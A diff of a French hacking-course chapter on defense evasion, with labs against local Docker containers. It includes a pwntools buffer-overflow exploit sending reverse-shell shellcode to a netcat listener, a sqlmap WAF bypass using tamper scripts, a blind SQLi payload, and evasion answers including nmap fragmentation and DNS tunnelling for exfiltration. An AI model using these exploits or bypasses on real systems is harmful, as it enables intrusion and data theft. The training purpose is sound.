@@ -11,226 +11,186 @@
 
 ---
 
-## Setup rapide
+## Introduction
 
-```bash
-if [ -f /.dockerenv ]; then
-    TARGET_BOF="buffovf"     ; PORT_BOF="9001"
-    TARGET_WAF="waf-target"  ; PORT_WAF="80"
-    TARGET_DVWA="dvwa"       ; PORT_DVWA="80"
-else
-    TARGET_BOF="localhost"   ; PORT_BOF="9001"
-    TARGET_WAF="localhost"   ; PORT_WAF="8081"
-    TARGET_DVWA="localhost"  ; PORT_DVWA="8080"
-fi
-KALI_IP=$(hostname -I | awk '{print $1}')
-DOCKER_BRIDGE=$(ip addr show docker0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
-echo "Kali: $KALI_IP | Bridge: $DOCKER_BRIDGE"
-echo "BuffOvF: $TARGET_BOF:$PORT_BOF | WAF: $TARGET_WAF:$PORT_WAF | DVWA: $TARGET_DVWA:$PORT_DVWA"
-```
+Les défenses évoluent. Firewalls, WAF, IDS/IPS forment un maillage que les attaquants contournent quotidiennement. Le CERT-FR documente ces techniques d'évasion dans ses bulletins d'actualité hebdomadaires — les vrais attaquants utilisent exactement ces méthodes.
+
+Ce chapitre est centré sur la tactique **TA0005 Defense Evasion** (50+ techniques). Vous apprendrez à contourner les protections par obfuscation et exploitation mémoire.
+
+> **Sources :** [ATT&CK Defense Evasion](https://attack.mitre.org/tactics/TA0005/). [CERT-FR](https://www.cert.ssi.gouv.fr/).
 
 ---
 
 ## 1. Buffer overflow — T1068 Exploitation for Privilege Escalation
 
-### Comprendre la pile
+### Fonctionnement technique
+
+Quand un programme appelle une fonction, il réserve un espace mémoire (stack frame). Les variables locales sont stockées avant l'adresse de retour :
 
 ```
 Adresses hautes
 +-----------------------------+
 |  arguments                  |
 +-----------------------------+
-|  adresse de retour (EIP)    | <-- L'attaquant veut contrôler ce registre
+|  adresse de retour (EIP)    | <-- Contrôler ce registre = contrôler l'exécution
 +-----------------------------+
 |  saved EBP                  |
 +-----------------------------+
-|  buffer local [64 octets]   | <-- Zone vulnérable (strcpy sans limite)
+|  buffer local [64 octets]   | <-- strcpy() écrit ici sans limite
 +-----------------------------+
 Adresses basses
 ```
 
-Principe : écrire plus de 64 octets dans `buffer` → déborder sur EIP → rediriger l'exécution vers notre shellcode.
+Si on écrit plus de 64 octets dans `buffer`, on déborde sur EIP. En y plaçant l'adresse de notre shellcode, on redirige l'exécution du programme.
+
+```mermaid
+flowchart LR
+    A["Payload :<br/>'A'*76 + NOP + Shellcode"] --> B["Débordement<br/>écrase EIP"]
+    B --> C["EIP → Shellcode"]
+    C --> D["Exécution arbitr.")
+```
 
 ---
 
 ## Lab 3.1 — Buffer Overflow avec pwntools
 
-### 📋 Fiche de lab
+### 📋 Fiche
 
-| Propriété | Valeur |
-|---|---|
-| **Durée** | 1h |
-| **Conteneur** | `buffovf` (port 9001) |
-| **Dossier de travail** | `~/cours-hacking/jour-3/labs/` |
-| **Tactique ATT&CK** | TA0004 → T1068 |
+| Durée | Conteneur | Dossier | Technique ATT&CK |
+|---|---|---|---|
+| 1h | buffovf (port 9001) | `~/cours-hacking/jour-3/labs/` | T1068 |
+
+### Contexte métier
+
+Les buffer overflows restent dans le top 3 des vulnérabilités critiques (MITRE CWE Top 25). Exploiter un BOF démontre la maîtrise de la mémoire — compétence exigée pour les certifications OSCP, OSED.
 
 ### Prérequis
 
-- [x] Conteneur buildé : `docker compose up -d --build buffovf`
-- [x] Port 9001 ouvert : `nc -z "$TARGET_BOF" "$PORT_BOF" && echo OK`
-- [x] pwntools : `pip install pwntools`
-- [x] `mkdir -p ~/cours-hacking/jour-3/labs && cd ~/cours-hacking/jour-3/labs`
+```bash
+docker compose up -d --build buffovf
+nc -z localhost 9001 && echo "OK"
+pip install pwntools
+mkdir -p ~/cours-hacking/jour-3/labs && cd ~/cours-hacking/jour-3/labs
+```
 
 ### Étape 1 — Test crash
 
 ```bash
-python3 -c "print('A'*100)" | nc "$TARGET_BOF" "$PORT_BOF"
-# → Input received: AAAA... (le programme répond avant de crasher)
+python3 -c "print('A'*100)" | nc localhost 9001
+# → Input received: AAAA... (le programme répond avant de crasher — overflow confirmé)
 ```
 
 ### Étape 2 — Exploit avec reverse shell
+
+Le code source vulnérable est dans `~/cours-hacking/repo/docker/buffovf/vuln.c` :
+
+```c
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // PAS de strncpy → overflow !
+}
+```
 
 Créez `~/cours-hacking/jour-3/labs/exploit_bof.py` :
 
 ```python
 #!/usr/bin/env python3
-"""
-Exploit buffer overflow — cible buffovf:9001
-Reverse shell vers Kali.
-"""
 from pwn import *
-import sys
 
 context.arch = 'i386'
 context.os = 'linux'
 
-# Récupérer la cible et l'IP Kali depuis les arguments
-TARGET = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
-PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9001
-CALLBACK_IP = sys.argv[3] if len(sys.argv) > 3 else '172.17.0.1'
+OFFSET = 76              # 64 buffer + 4 EBP + 8 align = 76
+CALLBACK_IP = "172.17.0.1"  # IP du bridge docker0
 CALLBACK_PORT = 4444
 
-OFFSET = 76  # 64 buffer + 4 EBP + 8 align
-print(f"[*] Cible : {TARGET}:{PORT}")
 print(f"[*] Reverse shell → {CALLBACK_IP}:{CALLBACK_PORT}")
-
-# Shellcode reverse shell
 shellcode = asm(shellcraft.i386.linux.connect(CALLBACK_IP, CALLBACK_PORT))
-print(f"[*] Shellcode : {len(shellcode)} octets")
 
-# Payload
-payload = b"A" * OFFSET
-payload += b"BBBB"              # EIP placeholder
-payload += b"\x90" * 32         # NOP sled
-payload += shellcode
-
+payload = b"A" * OFFSET + b"BBBB" + b"\x90" * 32 + shellcode
 print(f"[*] Payload : {len(payload)} octets")
 
-try:
-    r = remote(TARGET, PORT, timeout=10)
-    r.sendline(payload)
-    print("[+] Payload envoyé. Vérifiez l'écouteur netcat.")
-    r.interactive()
-except Exception as e:
-    print(f"[!] Erreur : {e}")
+r = remote('localhost', 9001, timeout=10)
+r.sendline(payload)
+print("[+] Payload envoyé. Vérifiez l'écouteur netcat.")
+r.interactive()
 ```
 
 ### Étape 3 — Lancer l'attaque
 
 ```bash
-cd ~/cours-hacking/jour-3/labs
-
-# Terminal 1 : écouteur netcat
+# Terminal 1
 nc -lvnp 4444
 
-# Terminal 2 : lancer l'exploit
-# Scénario A (Kali hôte) → reverse shell IP = docker0 bridge
-python3 exploit_bof.py "$TARGET_BOF" "$PORT_BOF" "$DOCKER_BRIDGE"
-
-# Scénario B (Kali Docker) → reverse shell IP = hostname -I
-python3 exploit_bof.py "$TARGET_BOF" "$PORT_BOF" "$KALI_IP"
+# Terminal 2
+cd ~/cours-hacking/jour-3/labs
+python3 exploit_bof.py
 ```
 
-**Checkpoint :** Shell reçu sur `nc -lvnp 4444`.
+**Checkpoint :** Shell reçu sur netcat. La cible (buffovf) exécute le shellcode.
 
-### Reverse shell IP — Diagnostic
-
-```mermaid
-flowchart TB
-    subgraph A["Scénario A — Kali hôte"]
-        KALI_A["Kali : $KALI_IP<br/>docker0 : $DOCKER_BRIDGE"]
-        BOF_A["buffovf conteneur"]
-        BOF_A -->|"Reverse shell → $DOCKER_BRIDGE:4444"| KALI_A
-    end
-    subgraph B["Scénario B — Kali Docker"]
-        KALI_B["kali-attacker : $KALI_IP"]
-        BOF_B["buffovf conteneur"]
-        BOF_B -->|"Reverse shell → $KALI_IP:4444"| KALI_B
-    end
-```
+### Diagnostic reverse shell IP
 
 ```bash
-# Test de connectivité avant l'exploit
-docker exec buffovf-target ping -c 1 "$DOCKER_BRIDGE" 2>/dev/null && \
-  echo "→ Bridge joignable (Scénario A)" || \
-  echo "→ Bridge injoignable, utilisez l'IP Docker (Scénario B)"
+# Trouver l'IP que les conteneurs Docker utilisent pour joindre Kali
+ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
+# → généralement 172.17.0.1
+
+# Vérifier la connectivité
+docker exec buffovf-target ping -c 1 172.17.0.1
 ```
 
 ---
 
 ## Lab 3.2 — Contournement WAF avec sqlmap
 
-### 📋 Fiche de lab
+### 📋 Fiche
 
-| Propriété | Valeur |
-|---|---|
-| **Durée** | 45 min |
-| **Conteneurs** | `waf-target`, `dvwa` |
-| **Tactique ATT&CK** | TA0005 Defense Evasion → T1562.001 |
+| Durée | Conteneur | Technique ATT&CK |
+|---|---|---|
+| 45 min | waf-target (port 8081) | T1562.001 Impair Defenses |
 
-### Prérequis
+### Contexte technique
 
-- [x] WAF buildé : `docker compose up -d --build waf-target`
-- [x] DVWA toujours lancé
-- [x] Cookie DVWA prêt (F12 → Storage → Cookies → PHPSESSID)
-
-### Comprendre le WAF
-
-Une app vulnérable derrière ModSecurity qui bloque les signatures SQLi connues.
+Un WAF (Web Application Firewall) bloque les signatures d'attaque connues. Mais il ne comprend pas le sens — il ne fait que du pattern matching. Si on modifie légèrement la syntaxe sans changer le sens, ça passe. C'est le principe de tous les tamper scripts sqlmap.
 
 ```mermaid
 flowchart LR
     A["Attaquant"] -->|"id=1 OR 1=1"| B["WAF ModSecurity"]
-    B -->|"SQLi détectée"| C["403 Forbidden"]
-    B -->|"Payload obfusqué"| D["App → 200 OK"]
+    B -->|"Signature SQLi"| C["403 Forbidden"]
+    A -->|"id=1/**/OR/**/1=1"| B
+    B -->|"Pas de signature"| D["App → 200 OK"]
 ```
 
 ### Étape 1 — Vérifier le blocage
 
 ```bash
-# Requête normale → 200
-curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_WAF}:${PORT_WAF}/?id=1"
+# Requête normale
+curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1"
 # → 200
 
-# SQLi brute → 403
-curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_WAF}:${PORT_WAF}/?id=1%20OR%201=1"
+# SQLi brute → bloquée
+curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
 # → 403 (WAF bloque)
-
-# Apostrophe → 403
-curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_WAF}:${PORT_WAF}/?id=1'"
-# → 403
 ```
 
-**Checkpoint A :** Requête normale = 200, SQLi = 403. Le WAF est actif.
-
-### Étape 2 — Bypass avec sqlmap tamper scripts
+### Étape 2 — Bypass avec sqlmap
 
 ```bash
 cd ~/cours-hacking/jour-3/labs
-
-sqlmap -u "http://${TARGET_WAF}:${PORT_WAF}/?id=1" \
+sqlmap -u "http://localhost:8081/?id=1" \
   --tamper=space2comment,charencode,randomcase \
   --batch --dbs 2>&1 | tee sqlmap_waf_bypass.txt
 ```
 
-**Checkpoint B :** sqlmap contourne le WAF et liste les bases.
+**Checkpoint :** sqlmap contourne le WAF et liste les bases.
 
 ### Tamper scripts utilisés
 
-| Tamper | Effet | Exemple |
+| Tamper | Effet | Avant → Après |
 |---|---|---|
 | `space2comment` | ` ` → `/**/` | `1 OR 1` → `1/**/OR/**/1` |
-| `charencode` | url-encode les caractères | `'` → `%27` |
+| `charencode` | Encode les caractères spéciaux | `'` → `%27` |
 | `randomcase` | Casse aléatoire | `SELECT` → `sELeCt` |
 
 ---
@@ -239,51 +199,60 @@ sqlmap -u "http://${TARGET_WAF}:${PORT_WAF}/?id=1" \
 
 ### Exercice 1 : Offset EIP avec GDB
 
-**Énoncé :** Confirmez l'offset EIP dans le conteneur buffovf avec GDB.
+**Énoncé :** Confirmez l'offset EIP dans le conteneur.
 
-<details>
-<summary><strong>Solution</strong></summary>
+<details><summary><strong>Solution</strong></summary>
 
 ```bash
 docker exec -it buffovf-target bash
-cd /opt
-python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/p.txt
-gdb -q ./vuln
-(gdb) run $(cat /tmp/p.txt)
-# noter la valeur de EIP après crash
-# Sur Kali : python3 -c "from pwn import *; print(cyclic_find(<EIP_VAL>))"
+cd /opt && gdb -q ./vuln
+(gdb) run $(python3 -c "print('A'*100)")
+# Noter la valeur de EIP après crash
 ```
 </details>
 
-### Exercice 2 : Blind SQLi manuelle
+### Exercice 2 : Blind SQLi sur DVWA medium
 
-**Énoncé :** Sur DVWA medium, extrayez le nom d'un utilisateur via blind SQLi booléenne.
+**Énoncé :** Extrayez un nom d'utilisateur via blind SQLi booléenne (sans union-based).
 
-<details>
-<summary><strong>Solution</strong></summary>
+<details><summary><strong>Solution</strong></summary>
 
 ```sql
--- Le 1er caractère est-il 'a' ?
 ' AND SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1)='a' --
--- Si la page change (5 users affichés), c'est 'a'. Sinon, essayer 'b', etc.
+-- Si la page montre 5 users, le 1er caractère est 'a'. Sinon, essayer 'b'...
 ```
+</details>
+
+### Exercice 3 : Choisir la technique d'évasion
+
+**Énoncé :** Pour chaque scénario, donnez la technique ATT&CK + l'outil/commande :
+
+1. Scan réseau sans déclencher l'IDS
+2. SQLi bloquée par WAF
+3. Exfiltration malgré firewall qui bloque le port 443
+
+<details><summary><strong>Solution</strong></summary>
+1. T1001 Data Obfuscation → `nmap -f -T1`
+2. T1562.001 Impair Defenses → `sqlmap --tamper=space2comment,randomcase`
+3. T1572 Protocol Tunneling → DNS tunnel (iodine) ou T1048.003 Exfiltration Over Alternative Protocol
 </details>
 
 ---
 
 ## Points clés à retenir
 
-- Buffer overflow : écraser EIP → rediriger vers shellcode
-- Reverse shell IP : `$DOCKER_BRIDGE` (Scénario A) ou `$KALI_IP` (Scénario B)
-- Blind SQLi extrait des données sans retour visible
-- WAF bypass : `--tamper=space2comment,charencode,randomcase`
-- TA0005 Defense Evasion : 50+ techniques d'évasion
+- **Buffer overflow** : écrire au-delà du buffer → contrôler EIP → exécuter du code arbitraire
+- **Reverse shell IP** : depuis un conteneur Docker vers Kali, utiliser `docker0` (172.17.0.1)
+- **WAF bypass** : le WAF fait du pattern matching, pas de la compréhension sémantique
+- **TA0005 Defense Evasion** : 50+ techniques documentées dans ATT&CK
+- Les vrais attaquants utilisent ces méthodes — le CERT-FR les documente chaque semaine
 
 ## Pour aller plus loin
 
-- [ATT&CK Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
+- [ATT&CK Defense Evasion (TA0005)](https://attack.mitre.org/tactics/TA0005/)
 - [Corelan Exploit Development](https://www.corelan.be/index.php/articles/)
 - [Awesome WAF](https://github.com/0xInfection/Awesome-WAF)
+- [CERT-FR](https://www.cert.ssi.gouv.fr/)
 
 ---
 
